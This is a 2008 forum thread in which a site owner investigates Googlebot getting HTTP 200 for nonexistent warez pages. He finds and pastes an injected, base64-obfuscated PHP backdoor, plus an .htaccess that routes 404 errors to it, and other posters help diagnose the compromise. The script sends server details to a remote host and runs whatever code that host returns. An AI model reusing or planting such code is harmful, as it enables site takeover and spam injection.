---
title: "GoogleBot doing sneaky searches?"
date: 2008-10-03
forum: The Cafe
---

### Post by Dr Small on 2008-10-03
Going through my access logs I am finding alot of strings like this from GoogleBot:
```
66.249.71.146 - - [03/Oct/2008:06:19:57 -0500] "GET /links/java-nfs-most-wanted-for-k700i.html HTTP/1.1" 200 7899 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.71.144 - - [03/Oct/2008:06:21:24 -0500] "GET /links/Motorola-Mobile-Phone-Tools-ver3.0.html HTTP/1.1" 200 8746 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.71.146 - - [03/Oct/2008:06:27:16 -0500] "GET /links/JS-Latvija-3.0-with-keygen(krack.html HTTP/1.1" 200 8839 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.71.146 - - [03/Oct/2008:06:27:17 -0500] "GET /links/descargar-AVI-MPEG.html HTTP/1.1" 200 7325 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.71.146 - - [03/Oct/2008:06:27:18 -0500] "GET /links/opencanvas-serial-key-4.06.html HTTP/1.1" 200 8496 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.71.146 - - [03/Oct/2008:06:27:18 -0500] "GET /links/uninstall-dvdxcopy-1.5.2.html HTTP/1.1" 200 10021 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.71.146 - - [03/Oct/2008:06:27:19 -0500] "GET /links/bloodpatch-mafia-DVD.html HTTP/1.1" 200 8838 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.71.145 - - [03/Oct/2008:06:30:51 -0500] "GET /links/nero-6.00.19-free.html HTTP/1.1" 200 8520 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"

```

The thing is, none of these files exist (I have checked, and double checked) in /links, yet GoogleBot is getting HTTP 200. Can anyone explain this phenomenon?

---

### Post by Dr Small on 2008-10-04
Bump. Anyone?

---

### Post by Barrucadu on 2008-10-04
If Googlebot is getting 200 responses for files that don't exist, surely it's a problem with your server?

---

### Post by Dr Small on 2008-10-04
Howso? None of the files are there, and when we attempt to access the same files as GoogleBot, we get HTTP 404. I don't see what the flaw could be, although I can plainly see there is one.

---

### Post by Joeb454 on 2008-10-04
Did you add a robots.txt to the web root?

---

### Post by Dr Small on 2008-10-04
> **Joeb454 said:**
> Did you add a robots.txt to the web root?
We've had one for quite a long time. But just all of sudden, Google appears to be running a full scan of the links/ directory for warez. (Of course, there isn't any there, but that's beside the point.) I just want to know what started this uproar by Google, and why they are scanning that directory day and night, and why they are getting HTTP 200.

---

### Post by Dr Small on 2008-10-07
Ok, here is some of the latest developments. In the /links directory (and /config directory on another subdomain) I found this file called "141583.php" and here is what it says:
```
<? error_reporting(0);$a=(isset($_SERVER["HTTP_HOST"])?$_SERVER["HTTP_HOST"]:$HTTP_HOST);$b=(isset($_SERVER["SERVER_NAME"])?$_SERVER["SERVER_NAME"]:$SERVER_NAME);$c=(isset($_SERVER["REQUEST_URI"])?$_SERVER["REQUEST_URI"]:$REQUEST_URI);$d=(isset($_SERVER["PHP_SELF"])?$_SERVER["PHP_SELF"]:$PHP_SELF);$e=(isset($_SERVER["QUERY_STRING"])?$_SERVER["QUERY_STRING"]:$QUERY_STRING);$f=(isset($_SERVER["HTTP_REFERER"])?$_SERVER["HTTP_REFERER"]:$HTTP_REFERER);$g=(isset($_SERVER["HTTP_USER_AGENT"])?$_SERVER["HTTP_USER_AGENT"]:$HTTP_USER_AGENT);$h=(isset($_SERVER["REMOTE_ADDR"])?$_SERVER["REMOTE_ADDR"]:$REMOTE_ADDR);$i=(isset($_SERVER["SCRIPT_FILENAME"])?$_SERVER["SCRIPT_FILENAME"]:$SCRIPT_FILENAME);$j=(isset($_SERVER["HTTP_ACCEPT_LANGUAGE"])?$_SERVER["HTTP_ACCEPT_LANGUAGE"]:$HTTP_ACCEPT_LANGUAGE);$z="/?".base64_encode($a).".".base64_encode($b).".".base64_encode($c).".".base64_encode($d).".".base64_encode($e).".".base64_encode($f).".".base64_encode($g).".".base64_encode($h).".e.".base64_encode($i).".".base64_encode($j);$f=base64_decode("cGhwYWR2LmNvLmNj");if (basename($c)==basename($i)&&isset($_REQUEST["q"])&&md5($_REQUEST["q"])=="ab5da33fffeec01719aa46f7d00fc3df") $f=$_REQUEST["id"];if((include(base64_decode("aHR0cDovL2Fkcy4=").$f.$z)));else if($c=file_get_contents(base64_decode("aHR0cDovLzcu").$f.$z))eval($c);else{$cu=curl_init(base64_decode("aHR0cDovLzcxLg==").$f.$z);curl_setopt($cu,CURLOPT_RETURNTRANSFER,1);$o=curl_exec($cu);curl_close($cu);eval($o);}; ?>
```

It was created by httpd:httpd and also, there is a .htaccess file in the same directory that contains this:
```
Options -MultiViews
ErrorDocument 404 //config/141583.php
```

What does the first file do, and how does this fit into the puzzle? By the way, Googlebot has used 16MBs of data from our website within the last 7 days, of things that do not exist. Any other ideas?

---

### Post by geoken on 2008-10-07
I'm pretty sure you got hacked. You should assume that anything on your server not explicitly created or uploaded by you is malicious.

---

### Post by notwen on 2008-10-07
> **Dr Small said:**
> there is a .htaccess file in the same directory

Finding this in any directory on your box is never a good sign(unless you put it there knowingly to limit directory access) publicly.  You may be hosting some files for others w/o knowing. =\

Best of luck.

---

### Post by Dr Small on 2008-10-07
> **notwen said:**
> Finding this in any directory on your box is never a good sign(unless you put it there knowingly to limit directory access) publicly.  You may be hosting some files for others w/o knowing. =\

Best of luck.
Well, if I am hosting these files that Google apparently can access with HTTP 200, then I certainly can't find them at the same URL as Google, nor anywhere else on the site. These two files in these two directories are the only abnormality that I have found.

---

### Post by snova on 2008-10-07
Ouch. I had to look up HTTP 200 to find out what it meant, and seeing that it means "success" when you aren't supposed to have these files here doesn't seem like a good thing.

Well, as far as I can tell, GoogleBot is accessing files in /links that do not exist. The 404 response is configured to be the PHP script in /config, so that gets executed.

I'm looking at the script, and I've figured out this much:

```
http://ads.phpadv.co.cc/?
http://7.phpadv.co.cc/?
http://71.phpadv.co.cc/?
```

I don't think you're hosting files, but a good deal of information about your server is being sent to this hostname. The nonexistent files are probably coming from this place, too, given all the "curl" stuff (which is an HTTP library, as far as I know).

Delete it. Fast. Shut down the server and FIND OUT HOW IT GOT THERE.

In addition, you should probably find out why GoogleBot is looking for these files. GoogleBot, like all crawlers, work by following links, so somewhere on the net is a link pointing to "files" on your server. I think Google offers something to find out this information.

Edit: I accidentally went to the site (stupid Opera, I like it but it's a little over-sensitive) and based on a twenty second read of the page it appears to automatically follow Google Ad links (that's what it says, anyway). Not to mention the bad grammar.

It smells all over.

---

### Post by notwen on 2008-10-08
Keep us informed on anything you find out.  Reading this made me go back and double-check my boxes.

---

### Post by odiseo77 on 2008-10-08
Hi. I don't know a thing about servers, and I didn't even know GoogleBot exist, so I'm not sure I understand all this problem, but for what I understand, isn't there the possibility that someone (or GoogleBot itself), thought you might be hosting certain type of files in your server (warez, in this case), and attempted searches (from google) for certain keywords or certain files on your server? (just an idea of what I can figure out about all this issue).

---

### Post by Dr Small on 2008-10-08
> **snova said:**
> Delete it. Fast. Shut down the server and FIND OUT HOW IT GOT THERE.


I have. I've deleted the .htaccess and those odd php files in the /links and /config directories. But, it hasn't stopped GoogleBot from coming. He can't access the files now (I setup a .htaccess to block Google's IP Range, so he is only getting HTTP 403 now), but it's still filling up the logs.

I don't know how it would have got there. Also, the box isn't mine. It belongs to IXWebhosting, where my Dad hosts.

> **snova said:**
> 
In addition, you should probably find out why GoogleBot is looking for these files. GoogleBot, like all crawlers, work by following links, so somewhere on the net is a link pointing to "files" on your server. I think Google offers something to find out this information.

That is by all means possible, but getting rid of those links that point through the website is another feat.

---

### Post by pp. on 2008-10-08
> **Dr Small said:**
> The thing is, none of these files exist (I have checked, and double checked) in /links, yet GoogleBot is getting HTTP 200. Can anyone explain this phenomenon?

Apparently you presume that the path part in the URL corresponds to an actual path into the file system of the server. However, this need not be the case.

The path (/links/java-nfs-most-wanted-for-k700i.html) may be relative to "any" directory within your file system. 

Then, the http server might serve something entirely different from what the URL appears to request. 

Have you tried to request those items through a browser from your server, or have you just searched the file system using ls and friends?

---

### Post by Dr Small on 2008-10-08
> **pp. said:**
> Apparently you presume that the path part in the URL corresponds to an actual path into the file system of the server. However, this need not be the case.

The path (/links/java-nfs-most-wanted-for-k700i.html) may be relative to "any" directory within your file system. 


No, it isn't. I am reading a specific log for that specific domain, and there is only one /links, and it will only log what happens inside that VirtualHost. The files are not on the server, nor in the /links directory.

> **pp. said:**
> 
Have you tried to request those items through a browser from your server, or have you just searched the file system using ls and friends?

I don't have direct access to the server (it's a shared server) and I don't have a shell. So naturally, I have not tried to access the files from a browser that is on the server. But, I have tried with a browser from a remote location, and it can not find the files.

So now, more specifically, is how I would stop GoogleBot from flooding the the server with (HTTP 403) requests. He isn't accessing anything anymore, so I just need to eliminate him altogether. I need to find out how to stop him. Any suggestions?

---

### Post by snova on 2008-10-08
GoogleBot wouldn't be attacking your server unless something on the net was linking to it. I have to wonder where it is, and why.

The fact that it is a shared server makes me suspect whoever else is using it.

I don't know if GoogleBot will eventually give up, or if it'll keep trying until there's no more links.

No idea what to do about the logs, though. I would suggest seeing if Apache can be configured to selectively ignore logging for particular clients, but you said it was a shared server, so...

---

### Post by pp. on 2008-10-08
> **Dr Small said:**
> so I just need to eliminate him altogether. I need to find out how to stop him. Any suggestions?

Have you tried contacting Google? They might be interested in stopping this, as well.

---

### Post by Dr Small on 2008-10-08
> **pp. said:**
> Have you tried contacting Google? They might be interested in stopping this, as well.
No. But I am thinking about doing that. It's been going on for over a week, and I want it to stop.

---

### Post by 4Orbs on 2008-10-08
I recall reading a forum where someone had a similar problem. It turned out that the poster had downloaded a free theme for his WordPress blog that had an encrypted hidden link in the footer. This was more than a year ago, so am unable to provide a link or any other info.

---

### Post by Dr Small on 2008-10-08
Update:

I added:
```
User-agent: Googlebot/2.1
Disallow: /links
```

to robots.txt, and after several more hours of hammering the server, Googlebot stopped to read robots.txt, and has not since been flooding the website. Let's hope this will end this nonsensical searches by Googlebot.

Dr Small

---

